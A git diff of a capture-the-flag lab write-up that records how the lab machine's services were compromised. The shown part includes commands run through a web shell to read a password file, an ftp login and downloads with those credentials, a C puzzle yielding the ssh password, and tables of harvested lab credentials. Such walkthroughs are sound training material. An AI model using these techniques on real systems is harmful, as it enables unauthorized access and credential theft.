@@ -121,7 +121,9 @@ It works ! There is two mails. One object mail is: "DB ACCESS"
 
 #### /phpmyadmin
 
-We can access the database with the credentials `root`:`Fg-'kKXBj87E:aJ$`
+| Protocol / App | Login  | Password           |
+| -------------- | ------ | ------------------ |
+| phpMyAdmin     | `root` | `Fg-'kKXBj87E:aJ$` |
 
 ##### userdata table
 
@@ -198,7 +200,183 @@ Cool, lets check it out at https://192.168.1.74/forum/templates_c/cmd.php
 
 We have a shell-like
 
+```shell
+ls -l
+total 0
+  drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+  drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+  drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+  drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
+  dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+  drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+  drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+
+ls -la /home/LOOKATME
+  total 1
+  drwxr-x--- 2 www-data www-data  31 Oct  8  2015 .
+  drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
+  -rwxr-x--- 1 www-data www-data 25 Oct  8  2015 password
+
+cat /home/LOOKATME/password
+  lmezard:G!@M6f4Eatau{sF"
+```
+
+We tried this credentials through ssh, then ftp. It works through ftp !
+
+## ftp connection
+
+| Protocol / App | Login     | Password           |
+| -------------- | --------- | ------------------ |
+| ftp            | `lmezard` | `G!@M6f4Eatau{sF"` |
+
+```shell
+ftp 192.168.1.74
+  Connected to 192.168.1.77.
+  220 Welcome on this server
+  Name (192.168.1.77:aurelien): lmezard
+  331 Please specify the password.
+  Password:
+  230 Login successful.
+
+ftp> ls -la
+  200 PORT command successful. Consider using PASV.
+  150 Here comes the directory listing.
+  dr-xr-x---    2 1001     1001           61 Oct 15  2015 .
+  dr-xr-x---    2 1001     1001           61 Oct 15  2015 ..
+  -rw-r--r--    1 0        0               1 Oct 15  2015 .bash_history
+  -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+  -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+
+ftp> mget README fun
+  mget README?
+  200 PORT command successful. Consider using PASV.
+  150 Opening BINARY mode data connection for README (96 bytes).
+  226 Transfer complete.
+  96 bytes received in 0.00 secs (629.1946 kB/s)
+
+  mget fun?
+  200 PORT command successful. Consider using PASV.
+  150 Opening BINARY mode data connection for fun (808960 bytes).
+  226 Transfer complete.
+  808960 bytes received in 0.00 secs (197.9688 MB/s)
+```
+
+Now we got the files, let see what they contain
+
+```shell
+cat README
+  Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+file fun
+  fun: POSIX tar archive (GNU)
+
+tar -xvf fun
+  ft_fun/
+  ft_fun/C4D03.pcap
+  ft_fun/GKGEP.pcap
+  ft_fun/A5GPY.pcap
+  (...)
+```
+
+While displaying the `fun` file, we saw there was a mix of tar archive containing \*.pcap files and C code.
+
+In the middle of the file, there was a main and some `getme#()` functions:
+
+```C
+char getme1() {
+    return 'I';
+}
+
+char getme2() {
+    return 'h';
+}
+
+char getme3() {
+    return 'e';
+}
+
+char getme4() {
+    return 'a';
+}
+
+char getme5() {
+    return 'r';
+}
+
+char getme6() {
+    return 't';
+}
+
+char getme7() {
+    return 'p';
+}
+
+char getme8() {
+    return 'w';
+}
+
+char getme9() {
+    return 'n';
+}
+
+char getme10() {
+    return 'a';
+}
+
+char getme11() {
+    return 'g';
+}
+
+char getme12()
+{
+    return 'e';
+}
+
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
+```
+
 ---
+
+### Passwords
+
+| Protocol / App | Login                  | Password                                                           |
+| -------------- | ---------------------- | ------------------------------------------------------------------ |
+| forum          | `lmezard`              | `!q\]Ej?*5K5cy*AJ`                                                 |
+| webmail        | `laurie@borntosec.com` | `!q\]Ej?*5K5cy*AJ`                                                 |
+| phpMyAdmin     | `root`                 | `Fg-'kKXBj87E:aJ$`                                                 |
+| ftp            | `lmezard`              | `G!@M6f4Eatau{sF"`                                                 |
+| ssh            | `laurie`               | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` |
 
 ### Sources
 
